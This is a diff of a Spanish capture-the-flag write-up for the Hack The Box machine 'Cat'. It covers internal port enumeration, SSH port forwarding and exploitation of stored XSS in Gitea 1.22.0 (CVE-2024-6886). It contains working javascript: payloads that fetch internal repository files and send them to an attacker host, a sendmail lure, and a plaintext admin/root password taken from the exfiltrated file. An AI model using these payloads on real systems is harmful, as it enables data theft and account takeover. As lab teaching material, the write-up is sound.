@@ -105,7 +105,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
@@ -118,27 +118,27 @@ Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 Accederemos a [http://cat.htb](http://cat.htb) y verificaremos el contenido del sitio web. Entre la información que podemos recopilar comprobamos diferentes páginas dentro del menú principal del sitio web.
 
-<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al acceder a la sección de `vote.php` verificamos que se trata de una página web en `PHP` de un concurso de gatos, en el cual nos permitían votar. En este caso, se nos indica que el proceso de votación se encuentra actualmente cerrado, por lo cual no podríamos interactuar con estas opciones.
 
-<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al acceder a la página de `winners.php`, verificamos una página web en donde muestran quién ha sido el ganador del concurso. No logramos obtener más información en esta sección.
 
-<figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verificamos también una página de `join.php` en la cual nos permite registrarnos como usuarios.
 
-<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Trataremos de registrarnos con un usuario de prueba para verificar si al acceder, nos proporcionan más acceso a otras secciones o si podemos realizar alguna acción con este usuario.
 
-<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1).png" alt="" width="476"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1) (1).png" alt="" width="476"><figcaption></figcaption></figure>
 
 Verificamos que nos aparece que el registro se ha realizado correctamente. El siguiente paso será iniciar sesión con el usuario recién creado para verificar si tenemos acceso.
 
-<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1).png" alt="" width="473"><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1) (1).png" alt="" width="473"><figcaption></figcaption></figure>
 
 
 
@@ -1023,7 +1023,7 @@ c34f48e1200***********************
 
 ## Privilege Escalation
 
-
+Revisaremos los grupos a los que forma parte el usuario `axel`, verificamos que no forma parte de un grupo que podamos aprovecharnos para escalar nuestros privilegios. Revisando si disponemos de algún permiso de `sudoers` comprobamos que no disponemos de ningún privilegio.
 
 ```bash
 axel@cat:~$ id
@@ -1033,7 +1033,7 @@ axel@cat:~$ sudo -l
 Sorry, user axel may not run sudo on cat.
 ```
 
-
+Revisando los usuarios del sistema que disponen de `bash`, comprobamos la existencia de más usuarios entre los cuales aparece uno mencionado como `git`.
 
 ```bash
 axel@cat:~$ cat /etc/passwd | grep bash
@@ -1044,11 +1044,9 @@ git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
 jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
 ```
 
-
-
 ### Checking internal ports
 
-
+Revisando los puertos internos del equipo, comprobamos algunos puertos abiertos que en el escaneo inicial con`Nmap` no pudimos verificar dado que no están expuestos. Entre los puertos encontrados, nos encontramos con el puerto 25 (`SMTP`) y algún otro que puerto más.
 
 ```bash
 axel@cat:~$ netstat -ano | grep LISTEN
@@ -1064,7 +1062,7 @@ tcp6       0      0 :::80                   :::*                    LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
 ```
 
-
+Realizaremos un `telnet` al `SMTP` para verificar el acceso y ferificamos que podemos enviar correos correctamente, por lo tanto, comprobamos que el servicio se encuentre funcionando correctamente.
 
 ```bash
 axel@cat:~$ telnet localhost 25
@@ -1088,7 +1086,13 @@ quit
 Connection closed by foreign host.
 ```
 
+Al revisar los demás puertos, verificamos la existencia del puerto `3000` abierto internamente. Revisando información por Internet, nos encontramos que este puerto es utilizado por `Gitea`. Al realizar un `cURL` al puerto `3000` interno del equipo, verificamos que nos devuelve un resultado en el cual mencionan a `Gitea`.
 
+<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+Gitea permite la creación y gestión de repositorios basados ​​en Git . También hace que la revisión de código sea increíblemente fácil y cómoda, mejorando la calidad del código para los usuarios y las empresas.
+{% endhint %}
 
 ```bash
 axel@cat:~$ curl 127.0.0.1:3000
@@ -1104,31 +1108,36 @@ axel@cat:~$ curl 127.0.0.1:3000
 	<meta name="referrer" content="no-referrer">
 ```
 
-
-
 ### Email found with valuable information
 
+Recordando que el servicio `SMTP` se encuentra expuesto y operativo, pensamos en que quizás habría algún tipo de información en el directorio de correos. Al acceder a `/var/mail` verificamos que existen diversos correos, entre los cuales el del usuario que disponemos actualmente (`axel`).
 
+En `/var/mail`, encontramos un correo dirigido a `axel` que nos proporciona información clave para nuestra escalada de privilegios.
 
-```bash
-axel@cat:/var/mail$ ls -l
+El primer mensaje menciona que están planeando lanzar **nuevos servicios web relacionados con gatos**, incluyendo un sitio de cuidado para gatos y otros proyectos. Se le pide a `axel` que envíe un correo a `jobert@localhost` con información sobre su repositorio en `Gitea`, ya que `Jobert` evaluará si es un proyecto prometedor para su desarrollo. Además, se destaca una nota importante donde se indica que es necesario incluir una **descripción clara del proyecto**, ya que el repositorio será revisado en su totalidad. Esto sugiere que cualquier archivo dentro del repositorio podría ser analizado, lo que podría darnos una pista sobre cómo interactúan internamente con Gitea o qué configuraciones están utilizando.
+
+El segundo mensaje nos revela que están desarrollando un **sistema de gestión de empleados**, el cual está alojado en un **Gitea privado** en [**http://localhost:3000/administrator/Employee-management/**](http://localhost:3000/administrator/Employee-management/). Además, se proporciona un enlace al **README.md** del proyecto ([**http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md**](http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md)), donde podríamos encontrar detalles técnicos, instrucciones o incluso credenciales útiles.
+
+Ahora que tenemos las **credenciales de axel**, podemos intentar acceder a Gitea, revisar los repositorios y buscar información sensible que nos ayude a escalar privilegios dentro del sistema.
+
+<pre class="language-bash"><code class="lang-bash">axel@cat:/var/mail$ ls -l
 total 40
 -rw-rw---- 1 axel   mail  1961 Jan 14 16:49 axel
 -rw-rw---- 1 jobert mail     0 Jan 14 16:54 jobert
 -rw------- 1 root   mail 30797 Feb  5 02:15 root
 
 axel@cat:/var/mail$ cat axel 
-From rosa@cat.htb  Sat Sep 28 04:51:50 2024
-Return-Path: <rosa@cat.htb>
+<strong>From rosa@cat.htb  Sat Sep 28 04:51:50 2024
+</strong>Return-Path: &#x3C;rosa@cat.htb>
 Received: from cat.htb (localhost [127.0.0.1])
 	by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
-	for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
+	for &#x3C;axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
 Received: (from rosa@localhost)
 	by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
 	for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
 Date: Sat, 28 Sep 2024 04:51:49 GMT
 From: rosa@cat.htb
-Message-Id: <202409280451.48S4pnlT001591@cat.htb>
+Message-Id: &#x3C;202409280451.48S4pnlT001591@cat.htb>
 Subject: New cat services
 
 Hi Axel,
@@ -1138,26 +1147,24 @@ We are planning to launch new cat-related web services, including a cat care web
 Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
 
 From rosa@cat.htb  Sat Sep 28 05:05:28 2024
-Return-Path: <rosa@cat.htb>
+Return-Path: &#x3C;rosa@cat.htb>
 Received: from cat.htb (localhost [127.0.0.1])
 	by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
-	for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
+	for &#x3C;axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
 Received: (from rosa@localhost)
 	by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
 	for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
 Date: Sat, 28 Sep 2024 05:05:28 GMT
 From: rosa@cat.htb
-Message-Id: <202409280505.48S55Sm0002267@cat.htb>
+Message-Id: &#x3C;202409280505.48S55Sm0002267@cat.htb>
 Subject: Employee management
 
 We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
-```
-
-
+</code></pre>
 
 ### SSH Port Forwarding
 
-
+Para verificar estos puertos internos, realizaremos `SSH Port Forwarding` para compartirnos el puerto del `SMTP` y del `Gitea`.
 
 ```bash
 ❯ ssh -L 25:127.0.0.1:25 -L 3000:127.0.0.1:3000 axel@cat.htb
@@ -1170,7 +1177,7 @@ Last login: Fri Jan 31 11:31:57 2025 from 10.10.14.69
 axel@cat:~$
 ```
 
-
+Verificaremos que realizando un escaneo de los puertos abiertos de nuestro equipo, verificamos que se ha realizado correctamente el `Port Forwarding`.
 
 ```bash
 ❯ nmap -p- localhost
@@ -1186,31 +1193,43 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
 ```
 
-
-
 ### Accesing on Gitea with axel credentials
 
-
+Accederemos a [http://localhost:3000](http://localhost:3000) y comprobaremos que efectivamente se trata del servicio de `Gitea`.
 
 <figure><img src="../../.gitbook/assets/imagen (295).png" alt=""><figcaption></figcaption></figure>
 
-
+Probaremos de acceder con las credenciales de `axel` en el `Gitea`.
 
 <figure><img src="../../.gitbook/assets/4468_vmware_VlFG15Xl52.png" alt=""><figcaption></figcaption></figure>
 
+Al acceder al `Gitea`, verificamos que en `Explore < Users`, aparecen los usuarios de `rosa`, `axel` y `administrator`.
 
+<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
 
+Accediendo al repositorio de `rosa` no encontramos ningún repositorio ni información relevante.
 
+<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
+
+Accediendo al repositorio de `administrator` tampoco logramos encontrar nada relevante.
+
+<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
+
+Tataremos de acceder a [http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md](http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md) que era el archivo que se nos indidcaba en el correo. Al tratar de acceder, verificamos que se nos indica que la página no existe o que pno disponemos del acceso necesario.
+
+<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
+
+Al tratar de acceder al repositorio raíz que encontramos ([http://localhost:3000/administrator/Employee-management/](http://localhost:3000/administrator/Employee-management/)), verificamos que tampoco disponemos del acceso correspondiente o que no existe la página web.&#x20;
+
+<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
 
 ### Gitea Exploitation - Cross-Site Scripting \[XSS] (CVE-2024-6886)
 
+Verificaremos que hemos podido acceder correctamente con las credenciales del usuario `axel`. Por otro lado, comprobamos la versión del `Gitea` que se trata de la `1.22.0`, con lo cual podremos intentar mirar si existen vulnerabilidades en esta versión.
 
+<figure><img src="../../.gitbook/assets/imagen (296).png" alt="" width="563"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (296).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Realizaremos una búsqueda sencilla con la herramienta de `searchsploit`y verificaremos que existe una vulnerabilidade de `XSS` para esta versión de `Gitea` a través del siguiente `CVE-2024-6886`.
 
 ```bash
 ❯ searchsploit Gitea 1.22.0
@@ -1222,64 +1241,82 @@ Gitea 1.22.0 - Stored XSS                                                       
 Shellcodes: No Results
 ```
 
-
-
 {% embed url="https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2024-6886" %}
 
 {% hint style="danger" %}
 Vulnerabilidad de neutralización incorrecta de la entrada durante la generación de páginas web (XSS o 'Cross-site Scripting') en Gitea Gitea Open Source Git Server permite XSS almacenado. Este problema afecta a Gitea Open Source Git Server: 1.22.0.
 {% endhint %}
 
+Gitea 1.22.0 tiene una vulnerabilidad de **Stored XSS** en la descripción de los repositorios, lo que permite inyectar un script malicioso que se ejecutará cuando otro usuario lo visualice.
 
+Dado que en el correo enviado a Axel se menciona que **Jobert revisará nuestro repositorio** y que debe incluir una descripción, podemos aprovechar esta vulnerabilidad para inyectar un **payload XSS**. Si Jobert hace clic en la descripción, ejecutará nuestro código malicioso, lo que nos abre la posibilidad de **explotar su sesión o realizar otros ataques basados en XSS**, como el robo de cookies, ejecución de acciones en su nombre o redirección a sitios maliciosos.
+
+<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Cookie Hijacking not available
 
+Lo primero que se nos ocurrió es en intentar robar la cookie de sesión de `Jobert` para tratar de acceder al `Gitea` con sus credenciales y verificar si hay algún tipo de contenido sensible que pueda tener credenciales, etc.&#x20;
 
+Revisando la página web de `Gitea`, verificamos que `HttpOnly` se encontraba en `False`, por lo tanto, no podríamos realizar el ataque de `Cookie Hijacking` debido que JavaScript no puede acceder directamente a la cookie.
 
-<figure><img src="../../.gitbook/assets/imagen (297).png" alt=""><figcaption></figcaption></figure>
+Dedido a esto, deberemos de buscar otras vías para realizar el ataque mediante XSS.
 
-
-
-<figure><img src="../../.gitbook/assets/imagen (298).png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../.gitbook/assets/imagen (297).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ### Data Exfiltration using XSS
 
+Dado que **HttpOnly está en true**, no podemos robar la cookie de sesión de Jobert. Sin embargo, hemos identificado que **Jobert podría tener acceso al archivo** `http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md`.
 
+Si este archivo está restringido para otros usuarios pero **Jobert sí tiene permisos para acceder**, podemos aprovechar el **XSS** para realizar **data exfiltration**. La clave aquí es que **cuando Jobert haga clic en nuestro payload malicioso, su navegador ejecutará la petición al archivo con sus propios permisos** y nos enviará su contenido a nuestro servidor externo.
+
+En otras palabras, aunque nosotros no podamos acceder directamente, **si Jobert visualiza nuestra carga maliciosa, su navegador actuará como puente** y nos filtrará la información sin que él lo note.
+
+**Explotación de la vulnerabilidad**
+
+El primer paso para realizar la explotación de esta vulnerabilidad de `XSS Stored` en `Gitea` es crear un nuevo repositorio.
+
+<figure><img src="../../.gitbook/assets/imagen (298).png" alt=""><figcaption></figcaption></figure>
+
+Crearemos un nuevo repositorio, en este caso con nuestro nombre `gzzcoo`. Siguiendo el PoC de la vulnerabilidad, deberemos de inyectar nuestro payload dentro de la descripción.
+
+En este caso, como queremos que se realice la exfiltración del archivo `README.md` para verificar si funciona, inyectamos el siguiente payload que reenviará los datos a nuestro servidor web externo.
 
 ```javascript
 <a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(response => response.text()).then(data => fetch('http://10.10.16.5/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">gzzcoo</a>
 ```
 
-
-
 <figure><img src="../../.gitbook/assets/imagen (299).png" alt=""><figcaption></figcaption></figure>
 
-
+El siguiente paso será crear un nuevo archivo en nuestro repositorio.
 
 <figure><img src="../../.gitbook/assets/imagen (300).png" alt=""><figcaption></figcaption></figure>
 
-
+Crearemos un archivo con el mismo nombre del repositorio, este archivo deberá estar completamente vacío.
 
 <figure><img src="../../.gitbook/assets/imagen (301).png" alt=""><figcaption></figcaption></figure>
 
+Una vez asignado el nombre del archivo, le daremos a la opción de **Commit Changes**.
+
 <figure><img src="../../.gitbook/assets/imagen (302).png" alt=""><figcaption></figcaption></figure>
+
+Verificaremos que se nos ha creado un nuevo repositorio llamado `gzzcoo` con una descripción que si nos fijamos haciendo `hovering` realiza la explotación de `XSS`.
 
 <figure><img src="../../.gitbook/assets/imagen (304).png" alt=""><figcaption></figcaption></figure>
 
-```
+Por nuestra parte, nos montaremos un servidor web para recibir esta información.
+
+```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo víctima, enviaremos un mail al usuario `jobert@localhost` indicándole el enlace al repositorio que contiene el payload malicioso.
 
 ```bash
 axel@cat:~$ echo -e "Subject: Repo \n\nHi check my repo http://localhost:3000/axel/gzzcoo" | sendmail jobert@localhost
 ```
 
-
+Después de un breve tiempo, verificamos que hemos recibido lo que parece ser el archivo `README.md`. Esto nos confirma que el usuario `jobert` está ingresando a nuestro repositorio, de la confirmación de la explotación de la vulnerabilidad XSS y de que el usuario dispone de permisos para acceder al archivo que nosotros no disponíamos acceso.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -1287,11 +1324,19 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.53 - - [05/Feb/2025 03:31:32] "GET /?response=%23%20Employee%20Management%0ASite%20under%20construction.%20Authorized%20user%3A%20admin.%20No%20visibility%20or%20updates%20visible%20to%20employees. HTTP/1.1" 200 -
 ```
 
-
+Al tratar de descodificar el contenido recibido, verificamos que es un archivo que no contiene información relevante para escalar privilegios, simplemente se indica que solamente está autorizado el usuario `admin`.
 
 <figure><img src="../../.gitbook/assets/imagen (305).png" alt=""><figcaption></figcaption></figure>
 
+Dado que estamos explorando la vulnerabilidad de **XSS** y exfiltración de datos, es importante considerar que el repositorio de Gitea de **Employee Management** podría contener más archivos que podrían ser útiles para nuestra explotación. Como **están desarrollando un sistema de gestión de empleados** (según el correo de Rosa), es probable que haya otros archivos en el repositorio de **Gitea** que contengan información sensible, como configuraciones, contraseñas o incluso detalles de la implementación del sistema.
 
+En base a lo que vimos en el sitio de **concurso de gatos** en `http://cat.htb`, donde las páginas estaban hechas con **PHP**, se nos ocurrió que quizás en la ruta de **Gitea de Administrator** para **Employee Management** haya un archivo `index.php`. Si existe, este archivo podría ser un punto de entrada interesante para continuar con la explotación de la vulnerabilidad.
+
+Si **index.php** está presente en el repositorio, podría estar configurado para servir páginas dinámicas, contener información de otros archivos, etc. Explotando el XSS, podemos dirigir el navegador de Jobert a una página específica del repositorio, como la de `index.php`, y desde ahí intentar inyectar código o exfiltrar datos adicionales.
+
+Por lo tanto, el siguiente paso sería verificar si **index.php** existe en la ruta mencionada, ya que esto nos brindaría más oportunidades para **profundizar en la explotación** de la vulnerabilidad y obtener información adicional o incluso ejecutar código remoto.
+
+Crearemos un nuevo repositorio que haga la exfiltración del archivo `index.php` hacía nuestro servidor de atacante.
 
 ```javascript
 <a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.16.5/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">gzzcoo</a>
@@ -1299,21 +1344,25 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <figure><img src="../../.gitbook/assets/imagen (306).png" alt=""><figcaption></figcaption></figure>
 
+Nuevamente volveremos a enviar un correo a `jobert@localhost` para que visualice nuestro repositorio que contiene el payload malicioso.
+
 ```bash
 axel@cat:~$ echo -e "Subject: Repo \n\nHi check my repo http://localhost:3000/axel/gzzcoo" | sendmail jobert@localhost
 ```
 
+Verificamos en nuestro servidor web que recibimos nuevamente datos, en este caso, de la página `index.php`.
 
-
-```
+```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.53 - - [05/Feb/2025 03:47:07] "GET /?response=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A HTTP/1.1" 200 -
 ```
 
-
+Al descodificar el contenido recibido, comprobamos que aparece el usuario `admin` con sus credenciales en texto plano.
 
 <figure><img src="../../.gitbook/assets/imagen (307).png" alt=""><figcaption></figcaption></figure>
+
+Intentamos verificar si estas credenciales encontradas se reutilizaban para el usuario `root` y comprobamos que efectivamente ganamos acceso con dicho usuario. También logramos visualizar la flag de **root.txt**.
 
 ```bash
 axel@cat:~$ su root
